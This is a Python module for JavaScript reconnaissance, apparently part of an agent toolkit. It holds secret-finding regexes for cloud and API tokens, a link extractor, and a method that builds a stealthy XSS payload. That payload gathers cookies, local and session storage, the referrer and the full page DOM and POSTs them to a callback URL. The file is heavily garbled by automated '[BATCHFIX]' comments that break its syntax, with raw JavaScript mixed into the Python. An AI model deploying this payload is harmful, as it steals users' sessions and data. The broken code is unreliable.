#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import aiohttp
from typing import List, Dict, Set, Optional
from urllib.parse import urljoin


class JSIntelligence:
# [BATCHFIX] Commented metadata/non-Python
#     pass  # [BATCHFIX] inserted for empty class
"""Intelligence module for JavaScript analysis, secret discovery, and link extraction."""
#     Ported from jsleak, LinkFinder, and jsluce.
# #

    # Secret Discovery Regexes (Ported from 0xSojalSec-jsleak)
    SECRET_PATTERNS = {
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Email": r"([a-zA-Z0-9][_\.\w]*)+@([a-zA-Z0-9][\w\-]*\.[a-zA-Z]{2,})\b",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "AWS Access Key": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "AWS MWS Key": ramzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Authorization Header": r"(?i)basic [a-z0-9=:_\+\/-]{5,100}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Bearer Token": r"(?i)bearer [a-z0-9=:_\+\/.-]{5,1000}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "Firebase URL": rhttps://[a-z0-9.-]+\.firebaseio\.com","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Google API Key": r"(?i)\b(AIza[0-9A-Za-z\\-_]{35})\b",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "Slack Token": rxox[baprs]-([0-9a-zA-Z]{10,48})","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "Slack Webhook": rhttps:\/\/hooks.slack.com\/(services|workflows)\/[A-Za-z0-9+\/]{44,46}","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Generic Secret": r"(?i)(api_key|apikey|secret|password|passwd|auth)(.{0,20})?['|\"][0-9a-zA-Z]{16,45}['|\"]",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "JSON Web Token": r"\bey[0-9a-z]{30,34}\.ey[0-9a-z-\/_]{30,500}\.[0-9a-zA-Z-\/_]{10,200}=",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Heroku API Key": r"(?i)heroku.*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Mailgun API Key": r"(?i)key-[a-f0-9]{32}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "Stripe API Key": r"(?i)(sk|pk)_(test|live)_[0-9a-z]{10,32}",
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "Twilio Account SID": rAC[0-9a-f]{32}","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "GitHub PAT": rghp_[0-9a-zA-Z]{36}","  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         "GitHub OAuth": rgho_[0-9a-zA-Z]{36}","  # [BATCHFIX] closed string
    }

    # Sink Hooks (Ported from 0xSojalSec-eval_villain)
    SINK_HOOKS = {
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "execution": ["eval", "Function", "setTimeout", "setInterval"],
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "dom_injection": ["set(Element.innerHTML)", "set(Element.outerHTML)", "document.write", "document.writeln"],
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "data_storage": ["localStorage.setItem", "sessionStorage.setItem"],
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         "navigation": ["window.location", "window.open"],
    }

    # Sources of Interest
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #     INPUT_SOURCES = ["location.hash", "window.name", "document.cookie", "document.referrer"]

    # Collection Primitives (Ported from 0xSojalSec-ezXSS)
    COLLECTION_PRIMITIVES = {
#         "basic_info":
            var data = {
                uri: location.toString(),
                cookies: document.cookie,
                referrer: document.referrer,
                ua: navigator.userAgent,
                origin: location.origin,
                localStorage: JSON.stringify(window.localStorage),
                sessionStorage: JSON.stringify(window.sessionStorage),
                dom: document.documentElement.outerHTML
            };
   "     ",
#         "page_extraction":
            function extractPath(path) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", path, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        sendCallback({path: path, content: xhr.responseText});
                    }
                };
                xhr.send();
 "          " }
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         ","  # [BATCHFIX] closed string
#         "callback_template":
            function sendCallback(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "{callback_url}", true);
                xhr.setRequestHeader("Content-type", "application/json");
# [BATCHFIX] Commented metadata/non-Python
#                 xhr.send(JSON.stringify("data));"  # [BATCHFIX] closed string
  "   "       }
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unterminated string
#         ","  # [BATCHFIX] closed string
    }

    # Link Extraction Regex (Ported from LinkFinder)
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unmatched parenthesis
#     LINK_REGEX = (
#         r"(?i)(?:\"|')((?:[a-z]{1,10}://|//)[^\"'/]{1,}\.[a-z]{2,}[^\"']{0,}|(?:/|\.\./|\./)"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         r"[^\"'><,;| *()(%%$^/\\\[\]][^\"'><,;|()]{1,}|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{1,}\."  # [BATCHFIX] closed string
#         r"(?:[a-z]{1,4}|action)(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{3,}"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string
#         r"(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         r"(?:[\?|#][^\"|']{0,}|))(?:\"|')"  # [BATCHFIX] closed string
    )

# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #     def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        self.session = session
        self._own_session = False

    async def get_session(self) -> aiohttp.ClientSession:
        if not self.session:
            self.session = aiohttp.ClientSession()
            self._own_session = True
        return self.session

# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #     async def extract_secrets(self, content: str) -> Dict[str, List[str]]:
# [BATCHFIX] Commented metadata/non-Python
# #         "Extracts secrets and sensitive patterns from JS content."  # [BATCHFIX] closed string
        results = {}
        for name, pattern in self.SECRET_PATTERNS.items():
            matches = re.findall(pattern, content)
            if matches:
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #                 results[name] = list(set(matches))
        return results

# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #     def extract_links(self, content: str, base_url: str) -> Set[str]:
""""Extracts and resolves links from JS content."""
        links = set()
        matches = re.finditer(self.LINK_REGEX, content)
        for match in matches:
            link = match.group(1).strip()
            if not link:
                continue

            # Resolve relative links
            try:
                full_url = urljoin(base_url, link)
                links.add(full_url)
            except Exception:
                pass
        return links

    def generate_xss_payload(self, callback_url: str, include_screenshot: bool = False) -> str:
        Generates a stealthy data collection payload for XSS testing.
        Based on ezXSS implementation.
# #
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented metadata/non-Python
# [BATCHFIX] Commented metadata/non-Python
# #         callback = self.COLLECTION_PRIMITIVES["callback_template"].replace("{callback_url}", callback_url)
# [BATCHFIX] Commented metadata/non-Python
# #         payload = f"(function(){{ {callback}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "var d={}; try{d.uri=location.toString()}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.cookies=document.cookie}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.ref=document.referrer}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.ua=navigator.userAgent}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.origin=location.origin}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.ls=JSON.stringify(window.localStorage)}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.ss=JSON.stringify(window.sessionStorage)}catch(e){}"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #         payload += "try{d.dom=document.documentElement.outerHTML}catch(e){}"  # [BATCHFIX] closed string

        if include_screenshot:
            # Note: Requires html2canvas to be present or loaded
# [BATCHFIX] Commented metadata/non-Python
# # [BATCHFIX] Commented unmatched parenthesis
#             payload += (
# [BATCHFIX] Commented metadata/non-Python
# #                 "try{html2canvas(document.body).then(function(c){d.scr=c.toDataURL();"  # [BATCHFIX] closed string
# [BATCHFIX] Commented metadata/non-Python
# #                 "sendCallback(d);})}catch(e){sendCallback(d);}"  # [BATCHFIX] closed string
            )
        else:
# [BATCHFIX] Commented metadata/non-Python
# #             payload += "sendCallback(d);"  # [BATCHFIX] closed string

# [BATCHFIX] Commented metadata/non-Python
# #         payload += "})();"  # [BATCHFIX] closed string
        return payload

    async def analyze_url(self, url: str) -> Dict:
#         "Downloads and analyzes a" JS file from a URL.
        try:
            session = await self.get_session()
            async with session.get(url, timeout=15, ssl=False) as response:
                if response.status == 200:
                    content = await response.text()
                    secrets = await self.extract_secrets(content)
                    links = self.extract_links(content, url)
                    return {
                        "url": url,
                        "status": "success",
                        "secrets_found": len(secrets),
                        "links_found": len(links),
                        "details": {"secrets": secrets, "links": list(links)},
                    }
        except Exception as e:
            return {"url": url, "status": "error", "message": str(e)}
        return {"url": url, "status": "error", "message": "Failed to fetch"}
